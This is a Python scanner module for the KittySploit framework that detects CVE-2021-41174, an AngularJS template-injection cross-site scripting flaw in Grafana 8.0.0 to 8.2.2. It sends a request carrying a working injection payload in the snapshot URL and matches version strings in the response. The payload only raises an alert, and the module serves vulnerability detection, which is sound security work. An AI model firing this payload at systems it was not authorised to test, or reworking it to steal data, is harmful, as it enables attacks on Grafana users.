#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Grafana is an open-source platform for monitoring and observability."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Grafana 8.0.0 <= v.8.2.2 - Angularjs Rendering Cross-Site Scripting Detection',
        'description': "Grafana is an open-source platform for monitoring and observability. In affected versions if an attacker is able to convince a victim to visit a URL referencing a vulnerable page, arbitrary JavaScript content may be executed within the context of the victim's browser. The user visiting the malicious link must be unauthenticated and the link must be for a page that contains the login button in the menu bar. The url has to be crafted to exploit AngularJS rendering and contain the interpolation binding for AngularJS expressions.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'grafana', 'xss', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/grafana/grafana/security/advisories/GHSA-3j9m-hcv9-rpj8',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-41174',
            'https://github.com/grafana/grafana/commit/3cb5214fa45eb5a571fd70d6c6edf0d729983f82',
            'https://github.com/grafana/grafana/commit/31b78d51c693d828720a5b285107a50e6024c912',
            'https://github.com/grafana/grafana/commit/fb85ed691290d211a5baa44d9a641ab137f0de88',
        ],
        'cve': 'CVE-2021-41174',
    }

    def run(self):
        r = self.http_request(method="GET", path='/dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Grafana', 'frontend_boot_js_done_time_seconds',)
        body_regexes = ('"subTitle":"Grafana (v8\\.(?:(?:1|0)\\.[0-9]|2\\.[0-2]))',)
        if (all(m in body for m in body_all)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Grafana 8.0.0 <= v.8.2.2 - Angularjs Rendering Cross-Site Scripting detected",
                path='/dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1',
            )
            return True
        return False

